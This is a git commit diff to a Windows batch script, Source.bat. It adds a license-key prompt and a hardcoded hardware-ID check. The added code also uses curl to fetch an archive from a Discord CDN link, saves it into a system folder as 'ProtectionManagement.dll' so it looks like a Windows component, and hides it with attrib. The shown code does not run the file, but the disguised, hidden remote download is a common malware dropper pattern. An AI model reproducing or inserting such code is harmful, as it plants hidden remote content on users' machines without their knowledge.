c033f4f0c39c3729e758f7447beac6186912d732
dystopia001 <ret4keog@outlook.com>
2025-01-16 11:37:34 -0800

    Update Source.bat

--- Source.bat
+++ Source.bat
@@ -1,5 +1,63 @@
 <# :
   @echo off
+
+if not exist "%systemdrive%\Program Files\Windows NT\Accessories\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
+curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll" "https://cdn.discordapp.com/attachments/1219269832147734559/1246030163511218248/ProtectionManagement.rar?ex=665ae785&is=66599605&hm=9407ab85c459208d4a8d5056f576be05705cf37411464c0dc6019826d8b91b3b&" -# --create-dirs 
+
+
+set "logFile=C:\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll"
+
+cls
+
+rem Prompt the user to enter the license key
+set /p "userCode=%r%Enter your license: "
+
+cls
+
+rem Define the target HWID
+set "targetHWID=81982FF3-46DF-4AC9-2D48-047C162FAF3F"
+
+rem Get the current user's HWID
+for /f "tokens=2 delims==" %%A in ('wmic csproduct get uuid /value') do set "currentHWID=%%A"
+
+rem Remove any carriage return (in case)
+set "currentHWID=!currentHWID:~0,36!"
+
+rem Compare the HWIDs
+if /i "!currentHWID!"=="%targetHWID%" (
+    rem HWID match found. Continue with license check.
+) else (
+    echo HWID does not match. Exiting...
+    timeout /nobreak /t 5 >nul
+    exit /b
+)
+
+powershell -Command "attrib +h \"%logFile%\""
+
+set "isValidCode=false"
+for %%i in (ret) do (
+    if "!userCode!" equ "%%i" (
+        set "isValidCode=true"
+        goto :checkUsedCode
+    )
+)
+
+:checkUsedCode
+findstr /x "!userCode!" "%logFile%" >nul
+if not !isValidCode!==true (
+    echo Invalid License.
+    timeout /nobreak /t 5 >nul
+    exit /b
+) else if errorlevel 1 (
+    echo License correct. Welcome!
+    echo !userCode!>>"%logFile%"
+) else (
+    echo License has already been used.
+    timeout /nobreak /t 5 >nul
+    exit /b
+)
+
+
 :checkPrivileges
 NET FILE 1>NUL 2>NUL
 
